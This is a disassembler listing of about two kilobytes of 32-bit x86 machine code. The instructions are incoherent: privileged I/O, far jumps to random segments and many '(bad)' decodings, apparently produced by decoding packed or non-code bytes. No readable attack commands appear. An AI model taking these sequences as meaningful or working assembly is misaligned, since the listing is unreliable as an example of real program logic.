  41287a:	or     al,0xed
  41287c:	lahf   
  41287d:	jno    0x4128ea
  41287f:	cld    
  412880:	mov    fs,WORD PTR ds:0xcffb7863
  412886:	pop    edx
  412887:	jecxz  0x4128d8
  412889:	push   es
  41288a:	int    0x2
  41288c:	icebp  
  41288d:	lahf   
  41288e:	fsub   st(5),st
  412890:	rol    BYTE PTR [edx],0x51
  412893:	in     eax,0xf9
  412895:	and    eax,0x1a689067
  41289a:	retf   
  41289b:	jno    0x41282b
  41289d:	mov    ebx,0xe77d325c
  4128a2:	push   ebp
  4128a3:	add    al,0xb7
  4128a5:	mov    esp,0xeb320d9b
  4128aa:	ja     0x4128e1
  4128ac:	adc    eax,ebx
  4128ae:	mov    ds:0x97d17196,eax
  4128b3:	xor    ecx,DWORD PTR [ebp+0x7e574bc5]
  4128b9:	xchg   ecx,eax
  4128ba:	adc    dh,BYTE PTR [ecx]
  4128bc:	retf   0x4511
  4128bf:	pop    ebp
  4128c0:	sti    
  4128c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128c2:	jmp    0xfb4c9679
  4128c7:	lds    edx,FWORD PTR [ebp+ecx*4-0xe]
  4128cb:	daa    
  4128cc:	ficomp WORD PTR [ecx-0x31e76bc5]
  4128d2:	mov    eax,0x813f48d0
  4128d7:	div    BYTE PTR [edi+0xc]
  4128da:	xor    al,0x4
  4128dc:	shl    BYTE PTR [esi-0x55],1
  4128df:	xchg   ebp,eax
  4128e0:	ins    DWORD PTR es:[edi],dx
  4128e1:	mov    cl,0xb0
  4128e3:	pop    es
  4128e4:	scas   eax,DWORD PTR es:[edi]
  4128e5:	and    DWORD PTR [esi-0x6a1109e0],0x28
  4128ec:	mov    ebx,0xf17a95da
  4128f1:	push   ecx
  4128f2:	rcl    cl,0x61
  4128f5:	mov    bl,0xb
  4128f7:	xchg   esp,eax
  4128f8:	fnstsw WORD PTR [ebp-0x73b6ab42]
  4128fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128ff:	lods   al,BYTE PTR ds:[esi]
  412900:	imul   ebx,DWORD PTR [esp+edx*8-0xbfb31ea],0x57f67ce4
  41290b:	and    ebx,eax
  41290d:	jae    0x412909
  41290f:	test   DWORD PTR es:[ebx-0x34],esi
  412913:	jnp    0x4128e7
  412915:	les    edi,FWORD PTR [edx+0x53fce2ea]
  41291b:	(bad)  
  41291d:	sub    al,0x6
  41291f:	inc    ecx
  412920:	or     DWORD PTR [edi-0x75411576],0xeef2c0df
  41292a:	push   ds
  41292b:	fld    st(4)
  41292d:	push   cs
  41292e:	lea    ebx,[ebx+0x1ce4c607]
  412934:	lds    esi,FWORD PTR [eax-0x6d0ad632]
  41293a:	arpl   si,bp
  41293c:	xor    eax,0xbf98b382
  412941:	adc    al,0x3e
  412943:	sub    eax,DWORD PTR [ebp+0x70]
  412946:	mov    ah,0xe8
  412948:	les    esi,FWORD PTR ds:0x313f9a7a
  41294e:	add    BYTE PTR [ecx+0x27c80923],0x24
  412955:	adc    eax,DWORD PTR [edi+0x16]
  412958:	out    dx,eax
  412959:	repz xchg esi,eax
  41295b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41295c:	jns    0x41290d
  41295e:	neg    DWORD PTR [ebp-0x5d7bb207]
  412964:	pop    eax
  412965:	aaa    
  412966:	mov    bh,0xfb
  412968:	sub    eax,0xe1a226b2
  41296d:	rcr    BYTE PTR [eax+ebp*8+0x76860b95],cl
  412974:	or     DWORD PTR [esi-0x70cc4666],0x6a299444
  41297e:	cmp    eax,ecx
  412980:	leave  
  412981:	(bad)  
  412982:	mov    ds:0x185f031a,al
  412987:	jnp    0x4129d4
  412989:	sbb    edi,ebp
  41298b:	fs jl  0x412921
  41298e:	mov    eax,0xcfa51ba5
  412993:	test   al,0xed
  412995:	xchg   edx,eax
  412996:	imul   ebp,DWORD PTR [ecx+0xea5c21d],0x3bbeebe3
  4129a0:	xchg   ecx,eax
  4129a1:	div    edi
  4129a3:	aas    
  4129a4:	add    eax,0x1421a0e2
  4129a9:	adc    DWORD PTR [eax+ebp*8],0x104dabd1
  4129b0:	enter  0xbef0,0xbc
  4129b4:	jne    0x412a26
  4129b6:	pusha  
  4129b7:	inc    ebx
  4129b8:	test   BYTE PTR [esi+0x78af38ef],cl
  4129be:	hlt    
  4129bf:	out    dx,al
  4129c0:	dec    edx
  4129c1:	retf   0x9223
  4129c4:	add    DWORD PTR [ebp+0x15f7370f],edi
  4129ca:	dec    eax
  4129cb:	clc    
  4129cc:	dec    ecx
  4129cd:	std    
  4129ce:	outs   dx,DWORD PTR ds:[esi]
  4129cf:	jl     0x412a26
  4129d1:	xor    al,0x85
  4129d3:	add    DWORD PTR [esi-0x10],ebp
  4129d6:	pop    ds
  4129d7:	dec    esp
  4129d8:	sbb    bh,BYTE PTR [edi+ebx*8]
  4129db:	sbb    ebx,DWORD PTR [ebp-0x3b1134b5]
  4129e1:	aaa    
  4129e2:	out    dx,al
  4129e3:	loopne 0x4129cd
  4129e5:	aas    
  4129e6:	mov    BYTE PTR [ebx-0x18],dl
  4129e9:	add    eax,0xe55a623d
  4129ee:	popa   
  4129ef:	test   eax,0x10c43fbd
  4129f4:	pop    edx
  4129f5:	xlat   BYTE PTR ds:[ebx]
  4129f6:	xchg   ebx,eax
  4129f7:	stc    
  4129f8:	cmp    al,0x35
  4129fa:	sbb    eax,0x1f9ddae7
  4129ff:	es or  eax,0xc6665791
  412a05:	imul   edi,DWORD PTR [ecx+edi*4],0xffffffbd
  412a09:	push   eax
  412a0a:	inc    ebx
  412a0b:	fsub   st,st(3)
  412a0d:	shr    BYTE PTR [ecx+ebp*4-0x5e288f4a],1
  412a14:	dec    ebp
  412a15:	and    eax,0x5d1149ca
  412a1a:	icebp  
  412a1b:	mov    al,0xe7
  412a1d:	jne    0x412a87
  412a1f:	mov    dl,0x81
  412a21:	xlat   BYTE PTR ds:[ebx]
  412a22:	cwde   
  412a23:	sub    DWORD PTR ds:0xa453352a,edx
  412a29:	sub    dl,BYTE PTR [ebp+esi*8+0x175bdf59]
  412a30:	loope  0x412a52
  412a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a33:	push   ecx
  412a34:	sbb    cl,BYTE PTR [esi+0x3756c512]
  412a3a:	add    BYTE PTR [edi+0x17226640],ah
  412a40:	(bad)  
  412a41:	int    0xb0
  412a43:	in     eax,0x86
  412a45:	or     ebx,DWORD PTR [eax-0x25ec65d6]
  412a4b:	or     al,0x25
  412a4d:	dec    ebx
  412a4e:	ret    0xc65e
  412a51:	mov    DWORD PTR [edi+0x54],0xf55fc2ac
  412a58:	jp     0x412a5c
  412a5a:	xchg   ecx,eax
  412a5b:	into   
  412a5c:	fsubr  st(6),st
  412a5e:	jmp    0xa2b3:0x9563ea86
  412a65:	cwde   
  412a66:	sahf   
  412a67:	fidiv  DWORD PTR [edx]
  412a69:	inc    eax
  412a6a:	lock cdq 
  412a6c:	neg    BYTE PTR [esi+0x7f]
  412a6f:	test   eax,0x48f91d4b
  412a74:	in     al,dx
  412a75:	in     eax,0xb2
  412a77:	test   eax,0x59a9d925
  412a7c:	jmp    0x216:0xecd425c1
  412a83:	push   edx
  412a84:	loopne 0x412abe
  412a86:	ja     0x412a97
  412a88:	cli    
  412a89:	stos   BYTE PTR es:[edi],al
  412a8a:	int3   
  412a8b:	or     al,0xc8
  412a8d:	cli    
  412a8e:	or     BYTE PTR [ebx],ah
  412a90:	inc    edi
  412a91:	loopne 0x412a23
  412a93:	addr16 mov al,0x29
  412a96:	mov    esi,0x438c218c
  412a9b:	pop    esp
  412a9c:	ins    DWORD PTR es:[edi],dx
  412a9d:	xchg   esi,eax
  412a9e:	mov    cl,0x2a
  412aa0:	add    bh,dl
  412aa2:	test   DWORD PTR [edi],ebx
  412aa4:	cmc    
  412aa5:	pop    edx
  412aa6:	push   ebp
  412aa7:	leave  
  412aa8:	pmullw mm2,QWORD PTR [ebx]
  412aab:	sbb    DWORD PTR [ecx-0x16276ef1],edx
  412ab1:	jmp    0x412a40
  412ab3:	bound  ebp,QWORD PTR [ebp+0x1353c408]
  412ab9:	or     eax,0x2c5701d0
  412abe:	cmp    esi,DWORD PTR [eax+0xbf24f3e]
  412ac4:	ret    
  412ac5:	and    bl,bl
  412ac7:	add    BYTE PTR [edx-0x699f26b9],cl
  412acd:	retf   
  412ace:	cmp    BYTE PTR [edx],bh
  412ad0:	add    DWORD PTR ds:0xc5a87120,eax
  412ad6:	push   es
  412ad7:	jae    0x412a7d
  412ad9:	mov    bl,al
  412adb:	cld    
  412adc:	mov    eax,ds:0x790eef75
  412ae1:	mov    esp,0x3a0f4ea1
  412ae6:	mov    esi,0xbeb77bfb
  412aeb:	mov    DWORD PTR [ebp+0x5cfbb83b],esi
  412af1:	test   eax,0xacf07395
  412af6:	dec    esp
  412af7:	xchg   ecx,eax
  412af8:	mov    eax,ds:0xada27ece
  412afd:	sti    
  412afe:	jmp    0xd9baa12a
  412b03:	sub    DWORD PTR [edx+0x16f7c9a7],esp
  412b09:	jmp    0xd2f5963
  412b0e:	(bad)  
  412b10:	xchg   esi,eax
  412b11:	popa   
  412b12:	lahf   
  412b13:	inc    ebp
  412b14:	inc    ebp
  412b15:	sar    BYTE PTR [edx-0x13],cl
  412b18:	jmp    0x412ae2
  412b1a:	cld    
  412b1b:	gs mov cl,0x5
  412b1e:	xor    bh,al
  412b20:	mov    eax,0x87b5b9e5
  412b25:	or     BYTE PTR [edi+ebx*4],0x36
  412b29:	add    bh,BYTE PTR [edi-0x1b86fb5f]
  412b2f:	mov    ch,ah
  412b31:	jae    0x412b26
  412b33:	idiv   DWORD PTR [esi-0x32284d19]
  412b39:	and    ebx,DWORD PTR [esi]
  412b3b:	ficom  WORD PTR [ebp+0x36]
  412b3e:	stc    
  412b3f:	jle    0x412afc
  412b41:	jmp    0x412b7c
  412b43:	push   0xea31c5b0
  412b48:	int3   
  412b49:	fistp  DWORD PTR [ebp+0x39bfb1dd]
  412b4f:	scas   eax,DWORD PTR es:[edi]
  412b50:	add    al,0x42
  412b52:	shl    DWORD PTR [edi+0x268525bb],0xd5
  412b59:	imul   ecx,eax,0xffffffc9
  412b5c:	(bad)  
  412b5d:	sub    al,0xb8
  412b5f:	cdq    
  412b60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b61:	sbb    ch,BYTE PTR ds:0xded558b6
  412b67:	mov    ebx,0xa890a2a9
  412b6c:	pop    es
  412b6d:	push   cs
  412b6e:	stos   DWORD PTR es:[edi],eax
  412b6f:	clc    
  412b70:	sbb    eax,0x2ee9844d
  412b75:	scas   al,BYTE PTR es:[edi]
  412b76:	stc    
  412b77:	mov    eax,DWORD PTR [edx+edi*4-0x5feb17e4]
  412b7e:	daa    
  412b7f:	test   BYTE PTR [edx-0x46ade2a],dl
  412b85:	dec    esi
  412b86:	adc    dl,ah
  412b88:	sub    bh,BYTE PTR ds:0x7e3d95b9
  412b8e:	test   BYTE PTR [ebx-0x52148570],bl
  412b94:	mov    ?,esi
  412b96:	adc    DWORD PTR [esp+esi*2],0xffffffd3
  412b9a:	(bad)
  412b9e:	cmp    eax,0xd6cc1275
  412ba3:	pop    edi
  412ba4:	inc    DWORD PTR [edx-0x60773e14]
  412baa:	in     eax,0xbd
  412bac:	cs push ss
  412bae:	pop    ebp
  412baf:	pop    edx
  412bb0:	sbb    BYTE PTR [esi+0x31],0xd5
  412bb4:	dec    edx
  412bb5:	jecxz  0x412c29
  412bb7:	out    dx,eax
  412bb8:	ins    DWORD PTR es:[edi],dx
  412bb9:	inc    ecx
  412bba:	leave  
  412bbb:	add    BYTE PTR [eax+eax*8-0x38b70447],cl
  412bc2:	push   edi
  412bc3:	in     al,0x49
  412bc5:	cmp    esp,DWORD PTR [eax+0x45b9a217]
  412bcb:	push   0x1668f847
  412bd0:	popa   
  412bd1:	(bad)  
  412bd2:	les    ecx,FWORD PTR [ebx-0x774b3ba4]
  412bd8:	push   0x4f7cf425
  412bdd:	push   eax
  412bde:	sub    WORD PTR [esi-0x75e5cf0f],si
  412be5:	ror    BYTE PTR [esi+ecx*1-0x28ab83ff],cl
  412bec:	cmp    eax,DWORD PTR [edi-0x37d8aa10]
  412bf2:	loop   0x412c1d
  412bf4:	dec    esi
  412bf5:	outs   dx,DWORD PTR ds:[esi]
  412bf6:	add    cx,WORD PTR [ecx+0x4b381cec]
  412bfd:	loope  0x412c40
  412bff:	pop    es
  412c00:	cwde   
  412c01:	push   cs
  412c02:	or     BYTE PTR [ebp+0x85510a2],dl
  412c08:	cwde   
  412c09:	push   ss
  412c0a:	mov    bh,BYTE PTR [edi]
  412c0c:	mov    ebp,0xb37b56cc
  412c11:	xor    eax,DWORD PTR [eax+0x5a]
  412c14:	loop   0x412c0c
  412c16:	mov    ch,cl
  412c18:	sub    DWORD PTR [edi+0x2e2280aa],eax
  412c1e:	clc    
  412c1f:	sub    DWORD PTR [ecx+0x1c2ca91c],eax
  412c25:	leave  
  412c26:	ds pop edx
  412c28:	fs sbb eax,0x5bed15b4
  412c2e:	cmp    dh,BYTE PTR [eax+ebx*1+0x6d]
  412c32:	mov    dl,0x92
  412c34:	orps   xmm6,XMMWORD PTR [ecx]
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	xchg   esi,esi
  412c3a:	jg     0x412c20
  412c3c:	xlat   BYTE PTR ds:[ebx]
  412c3d:	jl     0x412c3e
  412c3f:	push   eax
  412c40:	les    ecx,FWORD PTR [ebp+0x55]
  412c43:	in     eax,dx
  412c44:	cmp    eax,ebp
  412c46:	push   eax
  412c47:	mov    bl,0xc0
  412c49:	jl     0x412cba
  412c4b:	mov    WORD PTR [eax-0x7b632326],ss
  412c51:	call   0xa3d7:0xe2362da2
  412c58:	inc    ecx
  412c59:	test   eax,0x728c031b
  412c5e:	test   al,0x2b
  412c60:	nop
  412c61:	(bad)  
  412c62:	div    DWORD PTR [ebx+0x5c6aee8b]
  412c68:	dec    BYTE PTR [edx]
  412c6a:	call   0xcedb:0x6534899c
  412c71:	fisub  WORD PTR [esi-0x2cba8ca3]
  412c77:	sahf   
  412c78:	outs   dx,BYTE PTR ds:[esi]
  412c79:	jl     0x412cee
  412c7b:	adc    dh,dh
  412c7d:	pop    esp
  412c7e:	and    al,0x4
  412c80:	push   eax
  412c81:	fdivrp st(0),st
  412c83:	add    ch,cl
  412c85:	or     esi,0x8b409f60
  412c8b:	mov    edx,0xce777e59
  412c90:	test   al,0xdf
  412c92:	aaa    
  412c93:	xor    BYTE PTR [ebx+0x37],ch
  412c96:	mov    ecx,DWORD PTR [eax-0x35]
  412c99:	mov    dh,BYTE PTR [esi-0x4a23a3c5]
  412c9f:	inc    edx
  412ca0:	call   0x963d5e4a
  412ca5:	mov    WORD PTR [eax+0x4a],?
  412ca8:	and    BYTE PTR ds:0x38fb282b,bl
  412cae:	(bad)  [ebp+0x2c]
  412cb1:	mov    bh,0xd
  412cb3:	add    eax,0xbdf4c178
  412cb8:	in     al,0x7
  412cba:	jae    0x412c6a
  412cbc:	in     al,dx
  412cbd:	mov    bl,0x18
  412cbf:	and    dh,BYTE PTR [edx+0x71]
  412cc2:	cld    
  412cc3:	adc    cl,bh
  412cc5:	and    cl,dh
  412cc7:	xlat   BYTE PTR ds:[ebx]
  412cc8:	test   BYTE PTR [ecx+esi*1+0x47251d74],al
  412ccf:	mov    esi,0x441177a
  412cd4:	mov    al,0x52
  412cd6:	pop    esi
  412cd7:	ss jnp 0x412cd3
  412cda:	push   cs
  412cdb:	push   ss
  412cdc:	data16 loope 0x412d38
  412cdf:	test   eax,edx
  412ce1:	ret    0xb27d
  412ce4:	mov    ah,0x1b
  412ce6:	and    al,0xd8
  412ce8:	jmp    0xfb235a13
  412ced:	dec    eax
  412cee:	ins    DWORD PTR es:[edi],dx
  412cef:	fdivp  st(1),st
  412cf1:	push   0xffffffc3
  412cf3:	mov    al,ds:0x1b249401
  412cf8:	mov    eax,0x7d280f23
  412cfd:	cmp    BYTE PTR [ebp+0x78],ah
  412d00:	fs and eax,0x892dd048
  412d06:	push   0xffffff82
  412d08:	enter  0x875c,0xa3
  412d0c:	cmp    DWORD PTR [ecx+0x57],ebx
  412d0f:	test   BYTE PTR [esi+esi*2-0x460291c7],ch
  412d16:	fwait
  412d17:	loopne 0x412ccc
  412d19:	ret    
  412d1a:	inc    esp
  412d1b:	xor    BYTE PTR [edi+0x8],dl
  412d1e:	bt     DWORD PTR [ebx+0x7f34376e],esi
  412d25:	aad    0xd1
  412d27:	in     al,0x7d
  412d29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d2a:	cdq    
  412d2b:	outs   dx,BYTE PTR ds:[esi]
  412d2c:	enter  0x65ac,0x67
  412d30:	xor    cl,BYTE PTR [ecx]
  412d32:	mov    esp,0x38735fc0
  412d37:	das    
  412d38:	xlat   BYTE PTR ds:[ebx]
  412d39:	pushf  
  412d3a:	push   ss
  412d3b:	lods   al,BYTE PTR ds:[esi]
  412d3c:	jae    0x412cde
  412d3e:	dec    eax
  412d3f:	call   0x43d3:0x8948f9bc
  412d46:	popf   
  412d47:	cdq    
  412d48:	or     cl,BYTE PTR [edi+0x28]
  412d4b:	mov    edx,0xbe68c9cf
  412d50:	dec    ecx
  412d51:	inc    esi
  412d52:	das    
  412d53:	aad    0xa9
  412d55:	shr    BYTE PTR [edx-0x59129641],cl
  412d5b:	scas   eax,DWORD PTR es:[edi]
  412d5c:	test   DWORD PTR [eax+0x1a],ebp
  412d5f:	sub    DWORD PTR ds:[edx+esi*2-0x678f2c91],eax
  412d67:	aam    0xca
  412d69:	mov    ebx,0xd032dbe7
  412d6e:	sbb    eax,eax
  412d70:	dec    ebp
  412d71:	lea    edi,[eax-0x77]
  412d74:	pop    edx
  412d75:	mov    ah,0xb5
  412d77:	cli    
  412d78:	in     eax,dx
  412d79:	or     bh,al
  412d7b:	jl     0x412dd1
  412d7d:	or     ebp,DWORD PTR [ecx]
  412d7f:	fcomp  DWORD PTR ds:0xd98791a8
  412d85:	cmp    esi,ecx
  412d87:	aas    
  412d88:	push   es
  412d89:	mov    esp,DWORD PTR [edx-0x4d]
  412d8c:	in     al,dx
  412d8d:	(bad)  
  412d8e:	retf   
  412d8f:	jnp    0x412dc1
  412d91:	push   ebx
  412d92:	shl    BYTE PTR [ecx],cl
  412d94:	push   es
  412d95:	ds data16 (bad) 
  412d99:	xor    al,0x82
  412d9b:	popa   
  412d9c:	repz push esp
  412d9e:	mov    ecx,0xe2b35fa5
  412da3:	(bad)  
  412da4:	dec    ebx
  412da5:	pop    esp
  412da6:	push   esi
  412da7:	je     0x412dca
  412da9:	out    0x56,eax
  412dab:	icebp  
  412dac:	imul   ecx,ebx,0xffffffcc
  412daf:	add    cl,BYTE PTR [esi-0x23]
  412db2:	add    BYTE PTR [edx],bh
  412db4:	and    al,0x4d
  412db6:	(bad)
  412db9:	repnz mov ecx,0xff1f5537
  412dbf:	xor    ecx,esp
  412dc1:	iret   
  412dc2:	cmp    cl,BYTE PTR [edi]
  412dc4:	in     eax,0xb5
  412dc6:	mov    dh,0xe5
  412dc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dc9:	mov    edi,0x40c468ec
  412dce:	(bad)  
  412dcf:	mov    esp,0xd9b94525
  412dd4:	sbb    ah,BYTE PTR [bx+di+0x4f7b]
  412dd9:	cmp    al,0x6a
  412ddb:	jecxz  0x412d9a
  412ddd:	(bad)  
  412dde:	xor    edx,DWORD PTR [eax+0x7d]
  412de1:	dec    eax
  412de2:	test   BYTE PTR [eax-0x40],ah
  412de5:	mov    cl,0xfd
  412de7:	inc    ecx
  412de8:	pop    esp
  412de9:	cmp    dh,0xbf
  412dec:	scas   eax,DWORD PTR es:[edi]
  412ded:	test   cl,cl
  412def:	cmp    BYTE PTR [edx-0x64],dh
  412df2:	or     esi,eax
  412df4:	jbe    0x412dd0
  412df6:	jne    0x412dd5
  412df8:	(bad)  
  412df9:	out    dx,al
  412dfa:	jb     0x412d8b
  412dfc:	test   BYTE PTR [ebp-0x2e8427ca],ch
  412e02:	push   es
  412e03:	jl     0x412e5e
  412e05:	push   esi
  412e06:	pop    edi
  412e07:	xor    ch,BYTE PTR [edx+edx*1+0x50ad74cd]
  412e0e:	xchg   edx,eax
  412e0f:	push   ebx
  412e10:	jo     0x412de1
  412e12:	retf   0x66e1
  412e15:	jae    0x412e14
  412e17:	sub    eax,0x195771d5
  412e1c:	ret    
  412e1d:	inc    ebp
  412e1e:	pop    ss
  412e1f:	fdivr  st,st(1)
  412e21:	fwait
  412e22:	mov    esi,0xdc3fcce
  412e27:	nop
  412e28:	adc    DWORD PTR [ebx-0x6fdef26c],0xc8599450
  412e32:	xor    al,0x59
  412e34:	pusha  
  412e35:	fwait
  412e36:	sahf   
  412e37:	or     DWORD PTR [ebx],esp
  412e39:	inc    edi
  412e3a:	loope  0x412e0e
  412e3c:	add    al,0x25
  412e3e:	inc    ecx
  412e3f:	xor    DWORD PTR [edi+0x3e],ebp
  412e42:	cld    
  412e43:	adc    BYTE PTR [edi-0x70],0x13
  412e47:	les    ebx,FWORD PTR [edi+0x634b1eba]
  412e4d:	xchg   ecx,eax
  412e4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e4f:	cmp    bh,BYTE PTR [edi-0x27aa82ed]
  412e55:	inc    edx
  412e56:	sbb    BYTE PTR [ecx],bh
  412e58:	mov    ah,0xaa
  412e5a:	das    
  412e5b:	aad    0x46
  412e5d:	pop    ebx
  412e5e:	jnp    0x412e35
  412e60:	pop    DWORD PTR [ebp+0x634d9b6f]
  412e66:	data16 or al,0x64
  412e69:	aad    0x1f
  412e6b:	adc    eax,0x4ceab76b
  412e70:	mov    eax,0xfc0290b8
  412e75:	mov    eax,ebp
  412e77:	xor    al,0x1f
  412e79:	lods   al,BYTE PTR ds:[esi]
  412e7a:	cld    
  412e7b:	in     al,dx
  412e7c:	retf   0x4e24
  412e7f:	dec    ecx
  412e80:	aas    
  412e81:	pop    ebp
  412e82:	mov    edx,0x365908cc
  412e87:	js     0x412e1a
  412e89:	sub    edi,DWORD PTR [eax+ecx*2-0x5e]
  412e8d:	dec    ebp
  412e8e:	adc    dh,BYTE PTR [edi+0x63]
  412e91:	jbe    0x412f03
  412e93:	mov    edi,0x67162556
  412e98:	cli    
  412e99:	outs   dx,BYTE PTR ds:[esi]
  412e9a:	fidivr WORD PTR [ebx]
  412e9c:	mov    eax,0x1bc01451
  412ea1:	adc    eax,0x874943e1
  412ea6:	dec    esp
  412ea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ea8:	inc    ebx
  412ea9:	jmp    0x412e77
  412eab:	add    al,0x29
  412ead:	push   0xffffffff
  412eaf:	push   ecx
  412eb0:	inc    ecx
  412eb1:	(bad)  
  412eb2:	xchg   ebx,eax
  412eb3:	and    al,0x2e
  412eb5:	aas    
  412eb6:	push   ss
  412eb7:	pop    eax
  412eb8:	enter  0xa228,0xe6
  412ebc:	and    al,0x8
  412ebe:	fcomp  QWORD PTR [esp+ebx*2]
  412ec1:	inc    esi
  412ec2:	fisttp QWORD PTR [ecx-0x52]
  412ec5:	xor    BYTE PTR [edx],0xa6
  412ec8:	inc    ebx
  412ec9:	(bad)
  412ece:	loop   0x412f0c
  412ed0:	xor    esi,DWORD PTR ds:0x9802354d
  412ed6:	or     eax,0xbc2f7596
  412edb:	out    0xf1,eax
  412edd:	retf   0x6a8
  412ee0:	icebp  
  412ee1:	fld    QWORD PTR [ecx]
  412ee3:	jbe    0x412e81
  412ee5:	pusha  
  412ee6:	mov    ecx,0xe0ddb1ae
  412eeb:	repz cmp DWORD PTR [eax-0x37229ec2],ebx
  412ef2:	shl    BYTE PTR [eax-0x63],0xa7
  412ef6:	popf   
  412ef7:	push   ds
  412ef8:	sbb    DWORD PTR [esi],ecx
  412efa:	mul    DWORD PTR [edx+esi*1-0x468ccea7]
  412f01:	push   esp
  412f02:	pop    edx
  412f03:	mov    ds:0xafeeffd,eax
  412f08:	or     DWORD PTR [esi-0x32f585f1],esi
  412f0e:	adc    al,0xe2
  412f10:	pop    edi
  412f11:	iret   
  412f12:	pusha  
  412f13:	arpl   sp,di
  412f15:	int    0x20
  412f17:	scas   eax,DWORD PTR es:[edi]
  412f18:	lock cld 
  412f1a:	sbb    BYTE PTR [esi-0x6a],0xfe
  412f1e:	ins    BYTE PTR es:[edi],dx
  412f1f:	dec    eax
  412f20:	add    eax,DWORD PTR [eax]
  412f22:	sar    eax,1
  412f24:	js     0x412f2f
  412f26:	jmp    0x69ca3a7a
  412f2b:	bound  ebx,QWORD PTR [eax]
  412f2d:	xchg   BYTE PTR [edx],dl
  412f2f:	fs sbb esi,esi
  412f32:	jns    0x412f92
  412f34:	xor    BYTE PTR [ecx],bh
  412f36:	call   0xd69b:0xf21ba5cf
  412f3d:	pop    edx
  412f3e:	xchg   ecx,eax
  412f3f:	bound  edx,QWORD PTR [edi-0x6441ef7d]
  412f45:	enter  0xf3a0,0x7b
  412f49:	pop    edx
  412f4a:	push   ebp
  412f4b:	arpl   bp,bx
  412f4d:	fwait
  412f4e:	pop    ecx
  412f4f:	aas    
  412f50:	cmp    cl,BYTE PTR [esi]
  412f52:	jne    0x412eee
  412f54:	mov    ch,0x55
  412f56:	and    ah,BYTE PTR ds:0x44774f64
  412f5c:	adc    dl,BYTE PTR [edx-0x75dad80a]
  412f62:	(bad)  
  412f63:	pop    edi
  412f64:	push   ebx
  412f65:	xchg   esp,eax
  412f66:	pusha  
  412f67:	fs push cs
  412f69:	mov    al,0x43
  412f6b:	cmp    DWORD PTR [edx],0x563a484e
  412f71:	mov    al,ds:0xf339c1e0
  412f76:	pop    edx
  412f77:	stos   BYTE PTR es:[edi],al
  412f78:	bound  ebp,QWORD PTR [edi-0x6c]
  412f7b:	jne    0x412f45
  412f7d:	jmp    0x9a0fbf98
  412f82:	inc    edi
  412f83:	mov    ecx,0xecc3a1a3
  412f88:	sbb    BYTE PTR [ebx],dl
  412f8a:	ds pop edi
  412f8c:	mov    edi,0x73aee280
  412f91:	and    al,0x36
  412f93:	stos   DWORD PTR es:[edi],eax
  412f94:	mov    ch,0xf1
  412f96:	retf   
  412f97:	mov    edx,edx
  412f99:	and    al,dh
  412f9b:	sbb    BYTE PTR [esi],bl
  412f9d:	aam    0x4a
  412f9f:	iret   
  412fa0:	add    cl,dh
  412fa2:	pop    ds
  412fa3:	pop    ebx
  412fa4:	sbb    BYTE PTR [ecx-0x55de1e15],ah
  412faa:	scas   eax,DWORD PTR es:[edi]
  412fab:	ds mov bl,0xe
  412fae:	repnz dec edi
  412fb0:	mov    eax,0xef320d5b
  412fb5:	mov    bh,0x16
  412fb7:	dec    ecx
  412fb8:	out    0xaf,al
  412fba:	rol    esp,cl
  412fbc:	pop    eax
  412fbd:	and    esi,DWORD PTR [ecx+eax*1]
  412fc0:	pop    edx
  412fc1:	mov    dh,0xb
  412fc3:	mov    esi,0x7d7421ea
  412fc8:	lods   al,BYTE PTR ds:[esi]
  412fc9:	(bad)  
  412fcc:	mov    bl,cl
  412fce:	mov    esi,0xbc012231
  412fd3:	sub    esp,DWORD PTR [edi]
  412fd5:	mov    ds:0x65e5548a,eax
  412fda:	(bad)  
  412fdb:	jp     0x412fd6
  412fdd:	aam    0x4d
  412fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fe0:	lods   al,BYTE PTR ds:[esi]
  412fe1:	xchg   BYTE PTR [ebp-0x5dbabbe7],ch
  412fe7:	sbb    BYTE PTR [ebx+0x22],dl
  412fea:	pop    es
  412feb:	loopne 0x412fdd
  412fed:	into   
  412fee:	int    0x99
  412ff0:	outs   dx,DWORD PTR ds:[esi]
  412ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ff2:	or     DWORD PTR [ebx-0x40],ebx
  412ff5:	jmp    0x413039
  412ff7:	sbb    bl,ch
  412ff9:	cmc    
  412ffa:	jnp    0x413079
  412ffc:	xchg   edi,eax
  412ffd:	scas   al,BYTE PTR es:[edi]
  412ffe:	pop    es
  412fff:	sub    al,0xe3
  413001:	lods   al,BYTE PTR ds:[esi]
  413002:	mov    edi,0xdbe06a49
  413007:	stos   BYTE PTR es:[edi],al
  413008:	les    eax,FWORD PTR ds:0xf02c89d5
  41300e:	stos   DWORD PTR es:[edi],eax
  41300f:	popf   
  413010:	stc    
  413011:	fst    QWORD PTR [esi-0x72d721ba]
  413017:	(bad)  
  413018:	jbe    0x412fc8
  41301a:	cwde   
  41301b:	adc    DWORD PTR [eax-0x6d2e3f5c],eax
  413021:	jne    0x413084
  413023:	ret    0xd4a1
  413026:	jbe    0x412fb0
  413028:	ja     0x41301d
  41302a:	sub    BYTE PTR ds:0x97d34b8f,cl
  413030:	test   BYTE PTR [edi+0x30],0x8c
  413034:	(bad)  
  413035:	popf   
  413036:	fst    QWORD PTR [eax-0x4f8d3b22]
  41303c:	inc    ecx
  41303d:	stc    
  41303e:	pop    esi
  41303f:	and    al,0x6a
  413041:	or     DWORD PTR es:[ebx-0x28],ecx
  413045:	pop    ebp
  413046:	inc    ebx
  413047:	push   ecx
  413048:	aaa    
  413049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41304a:	push   0xffffffde
  41304c:	adc    al,dh
  41304e:	popf   
  41304f:	pop    edx
  413050:	pusha  
  413051:	inc    esp
  413052:	push   ebp
  413053:	fsub   st(0),st
  413055:	jl     0x412ff5
  413057:	mov    esi,0x50643808
  41305c:	(bad)  
  41305d:	sbb    eax,0xf35ff733
  413062:	mov    eax,0x8c5d4d19
  413068:	jmp    0x44ff:0x1f7ffb9f
  41306f:	jno    0x41303a
